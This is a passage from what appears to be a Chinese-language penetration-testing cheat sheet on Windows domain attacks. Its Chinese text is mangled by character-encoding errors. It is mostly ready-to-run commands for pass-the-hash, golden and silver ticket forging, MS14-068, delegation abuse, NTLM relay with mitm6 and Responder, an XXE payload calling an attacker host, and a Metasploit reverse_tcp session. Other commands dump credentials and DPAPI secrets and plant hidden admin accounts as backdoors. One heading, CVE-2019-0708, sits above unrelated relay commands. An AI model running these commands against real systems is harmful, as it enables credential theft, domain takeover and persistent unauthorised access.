</code></pre>
<p><img src="./img/387.png" alt="image"></p>
<h4 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h4><pre><code>&gt;psexec.exe -hashes AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09åŸŸå/Administrator@192.168.1.1 &quot;whoami&quot;
&gt;psexec.exe â€“accepteula \\192.168.1.2 â€“u admin â€“p pass cmd.exe æ— ç¡®è®¤çª—
Msf
#use exploit/windows/smb/psexec
#use exploit/windows/smb/psexec_psh(powershellç‰ˆæœ¬)
</code></pre>
<h4 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><pre><code>Windows XPã€Vistaã€2008ã€7ã€2008 r2 å’Œ2012æ²¡æœ‰å®‰è£…KB2871997è¡¥ä¸çš„æœºå™¨ä¸Šï¼Œä½¿ç”¨NTLMè¿›è¡ŒPTH
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:admin /domain:xxx.com /ntlm:&#123;ntlm&#125;
æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶
mimikatz # sekurlsa::pth /user:admin /domain:xxx.com /ntlm:&#123;ntlm&#125; /run:powershell.exe
Windows 8.1 ã€2012 R2ã€å®‰è£…KB2871997çš„Win 7 ã€2008 R2å’Œ2012ä¸Šå¯ä½¿ç”¨AES KEYè¿›è¡ŒPTH
&gt;privilege::debug
&gt;sekurlsa::ekeys
&gt;sekurlsa::pth /user:administrator /domain:zone.com /aes128:&#123;key&#125;
</code></pre>
<h4 id="pth-winexe"><a href="#pth-winexe" class="headerlink" title="pth-winexe"></a>pth-winexe</h4><pre><code>&gt;pth-winexe -U godadmin%password --system --ostype=1 //192.168.0.115 cmd
</code></pre>
<p><img src="./img/388.png" alt="image"></p>
<h4 id="Smbexec"><a href="#Smbexec" class="headerlink" title="Smbexec"></a>Smbexec</h4><pre><code>&gt;python smbexec.py administrator@192.168.0.98
</code></pre>
<p><img src="./img/389.png" alt="image"></p>
<h3 id="PASS-THE-TICKET"><a href="#PASS-THE-TICKET" class="headerlink" title="PASS-THE-TICKET"></a>PASS-THE-TICKET</h3><h4 id="åè¯"><a href="#åè¯" class="headerlink" title="åè¯"></a>åè¯</h4><pre><code>KDC(Key Distribution Center)ï¼š å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼Œé‡Œé¢åŒ…å«ä¸¤ä¸ªæœåŠ¡ï¼šASå’ŒTGS
AS(Authentication Server)ï¼š èº«ä»½è®¤è¯æœåŠ¡
TGS(Ticket Granting Server)ï¼š ç¥¨æ®æˆäºˆæœåŠ¡
TGT(Ticket Granting Ticket): ç”±èº«ä»½è®¤è¯æœåŠ¡æˆäºˆçš„ç¥¨æ®ï¼Œç”¨äºèº«ä»½è®¤è¯ï¼Œå­˜å‚¨åœ¨å†…å­˜ï¼Œé»˜è®¤æœ‰æ•ˆæœŸä¸º10å°æ—¶
</code></pre>
<h4 id="é»„é‡‘ç¥¨æ®-Mimikatz"><a href="#é»„é‡‘ç¥¨æ®-Mimikatz" class="headerlink" title="é»„é‡‘ç¥¨æ®+Mimikatz"></a>é»„é‡‘ç¥¨æ®+Mimikatz</h4><pre><code>Golden Ticketä¼ªé€ TGT(Ticket Granting Ticket)ï¼Œå¯ä»¥è·å–ä»»ä½•KerberosæœåŠ¡æƒé™ï¼Œ
åŸŸæ§ä¸­æå–krbtgtçš„hash
åŸŸæ§ï¼šdc.zone.com
åŸŸå†…æœºå™¨ï¼šsub2k8.zone.com
åŸŸå†…æ™®é€šç”¨æˆ·ï¼šy
åŸŸå†…æœºå™¨æ˜¯ä¸èƒ½è®¿é—®dcä¸Šçš„æ–‡ä»¶
</code></pre>
<p><img src="./img/390.png" alt="image"></p>
<pre><code>æ¸…ç©ºç¥¨æ®
</code></pre>
<p><img src="./img/391.png" alt="image"></p>
<pre><code>åŸŸæ§ä¸­è·å–krbtgtç”¨æˆ·çš„ä¿¡æ¯
&gt;privilege::debug
&gt;mimikatz log &quot;lsadump::dcsync /domain:zone.com /user:krbtgt&quot;
è·å–ä¿¡æ¯ï¼š/domainã€/sidã€/aes256
</code></pre>
<p><img src="./img/392.png" alt="image"></p>
<pre><code>åœ¨sub2k8ä¸­ç”Ÿæˆgolden ticket
&gt;mimikatz â€œkerberos::golden /krbtgt:&#123;ntlmhash&#125; /admin:åŸŸç®¡ç† /domain:åŸŸå /sid:sid /ticket:gold.kirbiâ€
</code></pre>
<p><img src="./img/393.png" alt="image"></p>
<pre><code>å¯¼å…¥
Mimikatz#kerberos::ptt 123.kirbi
</code></pre>
<p><img src="./img/394.png" alt="image"></p>
<h4 id="ç™½é“¶ç¥¨æ®-Mimikatz"><a href="#ç™½é“¶ç¥¨æ®-Mimikatz" class="headerlink" title="ç™½é“¶ç¥¨æ®+Mimikatz"></a>ç™½é“¶ç¥¨æ®+Mimikatz</h4><p><img src="./img/395.png" alt="image"></p>
<pre><code>Silver Ticketæ˜¯ä¼ªé€ çš„TGSï¼Œåªèƒ½è®¿é—®æŒ‡å®šæœåŠ¡æƒé™
åŸŸæ§ï¼šdc.zone.com
åŸŸå†…æœºå™¨ï¼šsub2k8.zone.com
åŸŸå†…æ™®é€šç”¨æˆ·ï¼šy
åŸŸæ§ä¸­å¯¼å‡º
&gt;privilege::debug
&gt;sekurlsa::logonpasswords
</code></pre>
<p><img src="./img/396.png" alt="image"></p>
<pre><code>Sub2k8ä¼ªé€ ç¥¨æ®
&gt;mimikatz &quot;kerberos::golden /domain:zone.com /sid:&#123;SID&#125; /target:dc.zone.com /service:cifs /rc4:&#123;NTLM&#125; /user:y /ptt&quot;
</code></pre>
<p><img src="./img/397.png" alt="image"></p>
<h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><pre><code>https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068
https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe
åŸŸæ§ï¼šdc.zone.com/10.1.1.100
åŸŸå†…æœºå™¨ï¼šsub2k8.zone.com/10.1.1.98
åŸŸå†…æ™®é€šç”¨æˆ·ï¼šyï¼Œ
Sub2k8ä¸­æ¸…é™¤ç¥¨æ®
Mimikatz#kerberos::purge
&gt;whoami /useræŸ¥çœ‹SID 
åˆ›å»ºccacheç¥¨æ®æ–‡ä»¶
&gt; MS14-068.exe -u y@zone.com -p password -s S-1-5-21-2346829310-1781191092-2540298887-1112 -d dc.zone.com
æ³¨å…¥ç¥¨æ®
Mimikatz# Kerberos::ptc c:\xx\xx\xxx.ccache
psexecæ— å¯†ç ç™»é™†
&gt;PsExec.exe \\dc.xx.com\ cmd.exe
</code></pre>
<h4 id="Mimikatz-MSF"><a href="#Mimikatz-MSF" class="headerlink" title="Mimikatz+MSF"></a>Mimikatz+MSF</h4><pre><code>&gt;whoami /user æŸ¥çœ‹SID
msf &gt;use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
msf &gt;set domain åŸŸå
msf &gt;set password å¯†ç 
msf &gt;set rhost åŸŸæ§æœºå™¨
msf &gt;set user ç”¨æˆ·
msf &gt;set user_sid sid
å¾—åˆ°.binæ–‡ä»¶
#apt-get install krb5-user
ä¸Šä¼ mimikatzå’Œbinæ–‡ä»¶
Mimikatz# Kerberos::clist â€œxxxx.binâ€ /export
ç”Ÿæˆkirbiæ–‡ä»¶
Meterpreter &gt;load kiwi
Meterpreter &gt;download c:/wmpub/xxxxxx.kirbi /tmp/
æ³¨å…¥ç¥¨æ®
Meterpreter &gt;kerberos_ticket_use /tmp/xxxxxx.kirbi
#use exploit/windows/local/current_user_psexec
#set TECHNIQUE PSH
#set RHOST dc.xx.com
#set payload windows/meterpreter/reverse_tcp
#set LHOST 192.168.1.1
#set session 1
#exploit
</code></pre>
<h4 id="goldenPac-py"><a href="#goldenPac-py" class="headerlink" title="goldenPac.py"></a>goldenPac.py</h4><pre><code>kaliä¸‹
#apt-get install krb5-user
#goldenPac.py â€“dc-ip 10.1.1.100 â€“target-ip 10.1.1.100 zone.com/y:password@dc.zone.com
</code></pre>
<h3 id="è´¦æˆ·å§”æ´¾"><a href="#è´¦æˆ·å§”æ´¾" class="headerlink" title="è´¦æˆ·å§”æ´¾"></a>è´¦æˆ·å§”æ´¾</h3><h4 id="è´¦æˆ·éå—é™å§”æ´¾"><a href="#è´¦æˆ·éå—é™å§”æ´¾" class="headerlink" title="è´¦æˆ·éå—é™å§”æ´¾"></a>è´¦æˆ·éå—é™å§”æ´¾</h4><pre><code>è®¾ç½®ç”¨æˆ·yä¸ºæœåŠ¡è´¦æˆ·(æœåŠ¡è´¦æˆ·æœ‰å§”æ´¾æƒé™)
&gt;setspn -U -A variant/golden y
</code></pre>
<p><img src="./img/398.png" alt="image"></p>
<pre><code>æŸ¥è¯¢éå—é™å§”æ´¾åŸŸå†…è´¦å·ï¼Œä½¿ç”¨powerview
&gt;Get-NetUser -Unconstrained -Domain zone.com
</code></pre>
<p><img src="./img/399.png" alt="image"></p>
<pre><code>åˆ©ç”¨
ç®¡ç†å‘˜æƒé™æ‰“å¼€mimikatzå¯¼å‡ºTGT
&gt;privilege::debug
&gt;sekurlsa::tickets /export
</code></pre>
<p><img src="./img/400.png" alt="image"></p>
<pre><code>æ¸…ç©ºç¥¨æ®ï¼Œå¯¼å…¥ç¥¨æ®
</code></pre>
<p><img src="./img/401.png" alt="image"><br><img src="./img/402.png" alt="image"></p>
<pre><code>è·å¾—Powershellä¼šè¯
&gt; Enter-PSSession -ComputerName dc.zone.com
</code></pre>
<p><img src="./img/403.png" alt="image"></p>
<h4 id="è´¦æˆ·å—é™å§”æ´¾"><a href="#è´¦æˆ·å—é™å§”æ´¾" class="headerlink" title="è´¦æˆ·å—é™å§”æ´¾"></a>è´¦æˆ·å—é™å§”æ´¾</h4><pre><code>æŸ¥è¯¢å—é™å§”æ´¾ç”¨æˆ·
&gt; Get-DomainUser -TrustedToAuth â€“Domain zone.com
</code></pre>
<p><img src="./img/404.png" alt="image"></p>
<pre><code>æŸ¥è¯¢å—é™å§”æ´¾ä¸»æœº
&gt; Get-DomainComputer -TrustedToAuth -Domain zone.com
</code></pre>
<p><img src="./img/405.png" alt="image"></p>
<pre><code>åˆ©ç”¨æ–¹æ³•åè§æƒé™ç»´æŒæ¨¡å—
</code></pre>
<h3 id="èµ„æºå—é™å§”æ´¾"><a href="#èµ„æºå—é™å§”æ´¾" class="headerlink" title="èµ„æºå—é™å§”æ´¾"></a>èµ„æºå—é™å§”æ´¾</h3><pre><code>è·å–åŸŸç®¡ç†å‘˜
&gt;Get-DomainUser|select -First 1
åŸŸå¯¹è±¡ä¿¡æ¯
&gt;Get-DomainObject -Identity &#39;DC=zone,DC=com&#39;
ms-ds-machineaccountquotaå…è®¸éç‰¹æƒç”¨æˆ·å°†æœ€å¤š 10 å°è®¡ç®—æœºè¿æ¥åˆ°åŸŸ
</code></pre>
<p><img src="./img/406.png" alt="image"></p>
<pre><code>æŸ¥çœ‹æœ‰æ²¡æœ‰è®¾ç½®msDS-AllowedToActOnBehalfOfOtherIdentityç­–ç•¥
&gt;Get-DomainComputer dc|select name, msDS-AllowedToActOnBehalfOfOtherIdentity
</code></pre>
<p><img src="./img/407.png" alt="image"></p>
<pre><code>ç”¨powermadæ·»åŠ ä¸€å…·å¤‡SPNçš„æœºå™¨è´¦æˆ·
https://github.com/Kevin-Robertson/Powermad
&gt;New-MachineAccount -MachineAccount newcom
</code></pre>
<p><img src="./img/408.png" alt="image"></p>
<pre><code>æˆ–
&gt;$pass = ConvertTo-SecureString &#39;123qwe!@#&#39; -AsPlainText â€“Force
&gt;New-MachineAccount â€“MachineAccount newcom -Password $pass
æˆ–
&gt;New-MachineAccount -MachineAccount newcom -Password $(ConvertTo-SecureString &#39;123qwe!@#&#39; -AsPlainText -Force)
</code></pre>
<p><img src="./img/409.png" alt="image"></p>
<pre><code>è·å–æ·»åŠ çš„æœºå™¨è´¦æˆ·çš„SID
</code></pre>
<p><img src="./img/410.png" alt="image"></p>
<pre><code>å°†æ·»åŠ çš„æœºå™¨è´¦æˆ·çš„SIDè®¾ç½®ç»™DCçš„msDS-AllowedToActOnBehalfOfOtherIdentityå‚æ•°
&gt;$SD=New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2346829310-1781191092-2540298887-1122)&quot;; $SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer dc | Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes&#125;
è®¾ç½®å®ŒæˆåæŸ¥çœ‹
</code></pre>
<p><img src="./img/411.png" alt="image"></p>
<pre><code>é…ç½®ACLå…è®¸è®¿é—®
&gt;$RawBytes=Get-DomainComputer dc -Properties &#39;msds-allowedtoactonbehalfofotheridentity&#39; |select -expand msds-allowedtoactonbehalfofotheridentity;$Descriptor= New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes,0;$Descriptor.DiscretionaryAcl
</code></pre>
<p><img src="./img/412.png" alt="image"></p>
<pre><code>æ­¤æ—¶ä½¿ç”¨åˆ›å»ºçš„æœºå™¨è´¦æˆ·çš„hashå¯ä¼ªé€ åŸŸç®¡
å…ˆè·å–newcomçš„NTLM
&gt;Rubeus.exe hash /password:123qwe!@# /user:newcom /domain:zone.com
</code></pre>
<p><img src="./img/413.png" alt="image"></p>
<pre><code>å¯¼å…¥ç¥¨æ®ä¼ªé€ åŸŸç®¡ç”¨æˆ·è®¿é—®cifsæœåŠ¡
&gt;Rubeus.exe s4u /user:newcom$ /rc4:00AFFD88FA323B00D4560B F9FEF0EC2F /impersonateuser:godadmin /msdsspn:cifs/dc.zone.com /ptt
</code></pre>
<p><img src="./img/414.png" alt="image"></p>
<pre><code>æˆåŠŸè·å–åˆ°godadminçš„tgs
</code></pre>
<p><img src="./img/415.png" alt="image"><br><img src="./img/416.png" alt="image"><br><img src="./img/417.png" alt="image"></p>
<h3 id="CVE-2019-0708"><a href="#CVE-2019-0708" class="headerlink" title="CVE-2019-0708"></a>CVE-2019-0708</h3><pre><code>&gt;python ntlmrelayx.py -t ldaps://dc.zone.com --remove-mic --delegate-access -smb2support
&gt;python printerbug.py zone.com/y@win7.zone.com 192.168.0.attack
&gt;python getST.py -spn host/win7.zone.com &#39;zone.com/æœºå™¨è´¦æˆ·$:å¯†ç &#39; -impersionate administrator -dc-ip 192.168.0.1
&gt;export KRB5CCNAME=XX.ccahe
&gt;python secretdump.py -k -no-pass dc.zone.com -just-dc
</code></pre>
<h3 id="NTLMä¸­ç»§"><a href="#NTLMä¸­ç»§" class="headerlink" title="NTLMä¸­ç»§"></a>NTLMä¸­ç»§</h3><h4 id="Ntlmrelayx-èµ„æºå—é™å§”æ´¾"><a href="#Ntlmrelayx-èµ„æºå—é™å§”æ´¾" class="headerlink" title="Ntlmrelayx+èµ„æºå—é™å§”æ´¾"></a>Ntlmrelayx+èµ„æºå—é™å§”æ´¾</h4><pre><code>åŸŸæ§éœ€å¯ç”¨ldapsï¼ŒåŸŸæœºå™¨å¯ç”¨ipv6
*å½“æ‰§è¡Œntlmrelayxè„šæœ¬æ—¶ï¼Œé‡åˆ°æŠ¥é”™
</code></pre>
<p><img src="./img/418.png" alt="image"></p>
<pre><code>ä¿®æ”¹
impacket/impacket/examples/ntlmrelayx/attacks/ldapattack.py ldapattack.pyè„šæœ¬ï¼Œåœ¨510è¡Œä¸Šæ–¹åŠ å…¥
if self.config.interactive: 
</code></pre>
<p><img src="./img/419.png" alt="image"></p>
<pre><code>å†é‡æ–°å®‰è£…&gt;python setup.py install
ä½¿ç”¨mitm6é€šè¿‡ipv6æ¥ç®¡dnsæœåŠ¡å™¨ï¼Œé…ç½®å¥½åå¼€å§‹è¯·æ±‚ç½‘ç»œçš„WPAD
&gt;mitm6 -i eth1 -d zone.com
</code></pre>
<p><img src="./img/420.png" alt="image"></p>
<pre><code>ä½¿ç”¨ntlmreplyx.pyç›‘å¬
&gt;python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --add-computer
å½“ç›®æ ‡é‡å¯ç½‘ç»œã€è®¿é—®æµè§ˆå™¨ã€é‡å¯ç”µè„‘æ—¶ä¼šæŠŠæ”»å‡»æœºè§†ä¸ºä»£ç†æœåŠ¡å™¨ï¼Œå½“ç›®æ ‡é€šè¿‡æ”»å‡»æœºä»£ç†æœåŠ¡å™¨è®¿é—®ç½‘ç»œæ—¶ï¼Œæ”»å‡»æœºå°†ä¼šå‘ç›®æ ‡å‘é€ä»£ç†çš„è®¤è¯è¯·æ±‚ï¼Œå¹¶ä¸­ç»§NTLMè®¤è¯åˆ°LDAPæœåŠ¡å™¨ä¸Šï¼Œå®Œæˆæ”»å‡»ã€‚
è¿™é‡Œè¦ä½¿ç”¨ldapsï¼Œå› ä¸ºåŸŸæ§ä¼šæ‹’ç»åœ¨ä¸å®‰å…¨çš„è¿æ¥ä¸­åˆ›å»ºè´¦æˆ·ã€‚
</code></pre>
<p><img src="./img/421.png" alt="image"></p>
<pre><code>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸæ·»åŠ äº†ä¸€ä¸ªæœºå™¨è´¦æˆ·RFAYOVCCå¯†ç 6YdX.NXqQGyuR7[
ä½¿ç”¨æ­¤æœºå™¨è´¦æˆ·ç”³è¯·ç¥¨æ®
&gt;python getST.py -spn cifs/sub2k8.zone.com zone.com/RFAYOVCC\$ -impersonate y
</code></pre>
<p><img src="./img/422.png" alt="image"></p>
<pre><code>&gt;export KRB5CCNAME=y.ccache
è·å–shell
&gt;python smbexec.py -no-pass -k sub2k8.zone.com
</code></pre>
<p><img src="./img/423.png" alt="image"></p>
<pre><code>dumphashã€ç¼“å­˜hash
&gt;python secretsdump.py -k -no-pass sub2k8.zone.com
</code></pre>
<p><img src="./img/424.png" alt="image"></p>
<pre><code>å½“åŸŸæ§æœºå™¨æœªå¯ç”¨LDAPSï¼Œå¹¶ä¸”å·²è·å¾—åŸŸæ™®é€šç”¨æˆ·æƒé™æ—¶
ä½¿ç”¨powermadåˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·newcom
https://github.com/Kevin-Robertson/Powermad
&gt;New-MachineAccount -MachineAccount newcom -Password $(ConvertTo-SecureString &#39;123qwe!@#&#39; -AsPlainText -Force)
</code></pre>
<p><img src="./img/425.png" alt="image"></p>
<pre><code>æˆ–
</code></pre>
<p><img src="./img/426.png" alt="image"><br><img src="./img/427.png" alt="image"></p>
<pre><code>&gt;python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --escalate-user newcom\$
</code></pre>
<p><img src="./img/428.png" alt="image"></p>
<pre><code>åç»­æ­£å¸¸æ“ä½œå³å¯ã€‚
å†…ç½‘å­˜åœ¨java webdavæ—¶PROPPATCHã€PROPFINDã€ LOCKç­‰è¯·æ±‚æ–¹æ³•æ¥å—XMLä½œä¸ºè¾“å…¥æ—¶ä¼šå½¢æˆxxeã€‚æ”»å‡»è€…è¦æ±‚é‡‡ç”¨NTLMè®¤è¯æ–¹å¼æ˜¯ï¼Œwebdavä¼šè‡ªåŠ¨ä½¿ç”¨å½“å‰ç”¨æˆ·çš„å‡­æ®è®¤è¯ã€‚
ä½¿ç”¨ntlmrelayxç›‘å¬
&gt;python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --escalate-user newcom\$
Burpå‘é€xxeè¯·æ±‚
PROPFIND /webdav HTTP/1.1
Host: 1.1.1.1

&lt;?xml version&quot;1.0&quot; encoding=&quot;UFT-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ENTITY loot SYSTEM &quot;http://10.1.1.101&quot;&gt; ]&gt;
&lt;D:xxe xmln:D=&quot;DAV:&quot;&gt;&lt;D:set&gt;&lt;D:prop&gt;
&lt;a xmlns=&quot;http://xx.e&quot;&gt;&amp;loot;&lt;/a&gt;
&lt;/D:prop&gt;&lt;/D:set&gt;&lt;/D:xxe&gt;
</code></pre>
<h4 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h4><h5 id="SMBåè®®æˆªè·"><a href="#SMBåè®®æˆªè·" class="headerlink" title="SMBåè®®æˆªè·"></a>SMBåè®®æˆªè·</h5><pre><code>å†…ç½‘ä¸­é—´äººæ”»å‡»è„šæœ¬ï¼Œkaliå†…ç½®
ç›‘å¬ç½‘ç»œæ¥å£
&gt;responder -I wlan0(eth0)
æŒ‡å®šæŸå°æœºå™¨æˆ–ç½‘æ®µï¼šä¿®æ”¹/etc/responder/Responder.pyä¸­RespondToå‚æ•°ã€‚
ç½‘æ®µä¸­æœ‰è®¤è¯è¡Œä¸ºä¼šæ•è·NTLMv2 hash
</code></pre>
<p><img src="./img/429.png" alt="image"></p>
<pre><code>å½“è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„å…±äº«æ—¶ä¿®æ”¹é…ç½®æ–‡ä»¶æ¥è§£æ
Xp
ä¿®æ”¹/usr/share/responder/servers/SMB.pyå®šä½åˆ°errorcodeä¿®æ”¹ä¸º\x71\x00\x00\xc0ï¼Œåˆ é™¤æ‰/usr/share/responder/Responder.db
</code></pre>
<p><img src="./img/430.png" alt="image"></p>
<pre><code>XPæ—¶ä½¿ç”¨\\cmd\shareå½¢å¼è®¿é—®å…±äº«è¾“å…¥å¯†ç è¾¾4æ¬¡ä¼šæ–­å¼€è¿æ¥ã€‚
å®šä½åˆ°
</code></pre>
<p><img src="./img/431.png" alt="image"></p>
<pre><code>ä¿®æ”¹self.ntry != 10
Win7ä»¥ä¸Š
ä¿®æ”¹/usr/share/responder/servers/SMB.pyå®šä½åˆ°##Session Setup 3
</code></pre>
<p><img src="./img/432.png" alt="image"></p>
<pre><code>åˆ é™¤æ‰and GrabMessageID(data)[0:1] == &quot;\x02&quot;ï¼Œåˆ é™¤æ‰/usr/share/responder/Responder.db
ä¿®æ”¹åå¯ä»¥è¿›è¡Œè§£æï¼Œæ•è·hashï¼Œå¦åˆ™ä¼šæŠ¥é”™è¯¯64
</code></pre>
<p><img src="./img/433.png" alt="image"></p>
<pre><code>å¼ºåˆ¶æˆªå–NTLMv1 hashï¼Œä¿®æ”¹/usr/share/responder/packets.pyï¼Œå®šä½åˆ°ä»¥ä¸‹å‚æ•°ï¼Œä¿®æ”¹ä¸º\x15\x82\x81\xe2ï¼Œä¿®æ”¹Confæ–‡ä»¶è®¾ç½®Challengeä¸º16ä½å›ºå®šå€¼ã€‚
</code></pre>
<p><img src="./img/434.png" alt="image"><br><img src="./img/435.png" alt="image"><br><img src="./img/436.png" alt="image"></p>
<h5 id="WPADä»£ç†æ¬ºéª—"><a href="#WPADä»£ç†æ¬ºéª—" class="headerlink" title="WPADä»£ç†æ¬ºéª—"></a>WPADä»£ç†æ¬ºéª—</h5><pre><code>&gt;responder -I eth0 -v -F 
Få‚æ•°å³å¯å¼€å¯å¼ºåˆ¶WPADè®¤è¯æœåŠ¡æŠ“å– hashï¼Œè®¿é—®IEæˆ–é‡å¯ç”µè„‘å³å¯å‘é€æ¬ºéª—è®¤è¯è·å¾—hashã€‚
</code></pre>
<p><img src="./img/437.png" alt="image"><br><img src="./img/438.png" alt="image"></p>
<pre><code>é‡å¯ä¹Ÿå¯ä»¥æŠ“åˆ°
</code></pre>
<p><img src="./img/439.png" alt="image"></p>
<h5 id="Webæ¼æ´"><a href="#Webæ¼æ´" class="headerlink" title="Webæ¼æ´"></a>Webæ¼æ´</h5><pre><code>å†…ç½‘ä¸­ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å’ŒXSS
&gt;Responder -I eth0 -v
http://10.1.1.1/file.php?file=\\10.1.1.12\share
http://10.1.1.1/xss.php?article=&lt;img src=\\10.1.1.12\xx&gt;
</code></pre>
<h5 id="ä¸­ç»§æ”»å‡»"><a href="#ä¸­ç»§æ”»å‡»" class="headerlink" title="ä¸­ç»§æ”»å‡»"></a>ä¸­ç»§æ”»å‡»</h5><pre><code>ä¿®æ”¹/etc/responder/Responder.confæ–‡ä»¶ï¼Œé…ç½®smbå’Œhttpä¸ºOffï¼Œåˆ†åˆ«å¼€å¯ä¸¤ä¸ªå¯¹è¯æ¡†ï¼Œä½¿ç”¨Få‚æ•°å¯ç”¨WPADæ¬ºéª—æµè§ˆå™¨ï¼Œä½¿ç”¨/usr/share/responder/toolsä¸­çš„MultiReplay.pyè¿›è¡Œä¸­ç»§æ”»å‡»è·å¾—ç›®æ ‡cmdshellã€‚
&gt;Responder -I eth0 -v -F
&gt;python MultiReplay.py -t 192.168.0.115 -u ALL
</code></pre>
<p><img src="./img/440.png" alt="image"><br><img src="./img/441.png" alt="image"></p>
<h5 id="NTLMv2Hashç ´è§£"><a href="#NTLMv2Hashç ´è§£" class="headerlink" title="NTLMv2Hashç ´è§£"></a>NTLMv2Hashç ´è§£</h5><pre><code>ä½¿ç”¨hashcatç ´è§£ -m 5600ä¸ºNTLMv2ç±»å‹
&gt;hashcat -m 5600 pass.txt wordlists.txt
</code></pre>
<p><img src="./img/442.png" alt="image"></p>
<h3 id="GPP-Password"><a href="#GPP-Password" class="headerlink" title="GPP-Password"></a>GPP-Password</h3><pre><code>åŸŸå†…æœºå™¨å¯è®¿é—®\\zone.com\SYSVOL\zone.comå…±äº«æ–‡ä»¶å¤¹ï¼Œç¿»çœ‹ç­–ç•¥æ–‡ä»¶ï¼ŒæŸ¥æ‰¾groups.xmlï¼ŒScheduledTasks\ScheduledTasks.xmlï¼ŒPrinters\Printers.xmlï¼ŒDrives\Drives.xmlï¼ŒDataSources\DataSources.xmlï¼Œ Services\Services.xmlç­‰æ–‡ä»¶
</code></pre>
<p><img src="./img/443.png" alt="image"></p>
<pre><code>ä½¿ç”¨powersploitè„šæœ¬è§£å¯†
</code></pre>
<p><img src="./img/444.png" alt="image"></p>
<pre><code>ä½¿ç”¨msfçš„auxiliary/scanner/smb/smb_enum_gppæ¨¡å—
</code></pre>
<p><img src="./img/445.png" alt="image"></p>
<h3 id="WinRMæ— æ–‡ä»¶æ‰§è¡Œ"><a href="#WinRMæ— æ–‡ä»¶æ‰§è¡Œ" class="headerlink" title="WinRMæ— æ–‡ä»¶æ‰§è¡Œ"></a>WinRMæ— æ–‡ä»¶æ‰§è¡Œ</h3><pre><code>&gt;winrm quickconfig â€“qå¯åŠ¨winrm
æˆ–PS&gt;Enable-PSRemoting -Force
ç”Ÿæˆæœ¨é©¬å¹¶å¯åŠ¨ç›‘å¬
</code></pre>
<p><img src="./img/446.png" alt="image"><br><img src="./img/447.png" alt="image"></p>
<pre><code>æ”¾å…¥å·²è·å¾—æƒé™çš„æœºå™¨Cç›˜ä¸­
å†…ç½‘å¦å¤–æœºå™¨ä¸­æ‰§è¡Œ
&gt;net use \\192.168.0.115\c$
&gt;winrm invoke create wmicimv2/win32_process @&#123;commandline=&quot;\\192.168.0.115\c\index.exe&quot;&#125;
</code></pre>
<h3 id="æ·»åŠ åŸŸç®¡å‘½ä»¤"><a href="#æ·»åŠ åŸŸç®¡å‘½ä»¤" class="headerlink" title="æ·»åŠ åŸŸç®¡å‘½ä»¤"></a>æ·»åŠ åŸŸç®¡å‘½ä»¤</h3><pre><code>&gt;net user admin$ pass@123 /add /doamin
&gt;net group &quot;Domain admins&quot; admin$ /add /domain
</code></pre>
<h3 id="SSHå¯†é’¥å…å¯†ç™»å½•"><a href="#SSHå¯†é’¥å…å¯†ç™»å½•" class="headerlink" title="SSHå¯†é’¥å…å¯†ç™»å½•"></a>SSHå¯†é’¥å…å¯†ç™»å½•</h3><pre><code>&gt;ssh -i id_rsa user@192.168.0.110
</code></pre>
<h3 id="è·å–ä¿å­˜çš„RDPå¯†ç "><a href="#è·å–ä¿å­˜çš„RDPå¯†ç " class="headerlink" title="è·å–ä¿å­˜çš„RDPå¯†ç "></a>è·å–ä¿å­˜çš„RDPå¯†ç </h3><pre><code>ä½ç½®
C:\Users\ç”¨æˆ·å\AppData\Local\Microsoft\Credentials
æŸ¥çœ‹å‘½ä»¤
&gt;cmdkey /list
&gt;mimikatz log
#dpapi::cred /in:C:\Users\administrator\AppData\Local\Microsoft\Credentials\D53BF8DC4D52D75463D46595907A4015
è®°å½•guidMasterKey: &#123;572115f2-80b1-4b1e-be1b-425f5c7a8bfd&#125;
#privilege::debug
#sekurlsa::dpapi
æ‰¾åˆ°GUIDä¸ºguidMasterKeyçš„å€¼ä¸‹é¢çš„MasterKey: d928f5e02d2e9495f92bbâ€¦
#dpapi::cred /in:C:\Users\administrator\AppData\Local\Microsoft\Credentials\D53BF8DC4D52D75463D46595907A4015 /masterkey: d928f5e02d2e9495f92bbâ€¦
å¯†ç ä¸ºCredentialBlobå€¼ã€‚
</code></pre>
<h2 id="åé—¨-amp-æŒä¹…åŒ–-1"><a href="#åé—¨-amp-æŒä¹…åŒ–-1" class="headerlink" title="åé—¨&amp;æŒä¹…åŒ–"></a>åé—¨&amp;æŒä¹…åŒ–</h2><h3 id="å½±å­ç”¨æˆ·"><a href="#å½±å­ç”¨æˆ·" class="headerlink" title="å½±å­ç”¨æˆ·"></a>å½±å­ç”¨æˆ·</h3><pre><code>&gt;net user test$ test /add
&gt;net localgroup administrators test$ /add
æ³¨å†Œè¡¨HKEY_LOCAL_MACHINE\SAM\SAM\
ç»™äºˆadministrator SAMçš„å®Œå…¨æ§åˆ¶å’Œè¯»å–çš„æƒé™
ä»¥ä¸‹å¯¼å‡ºä¸º1.reg
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$
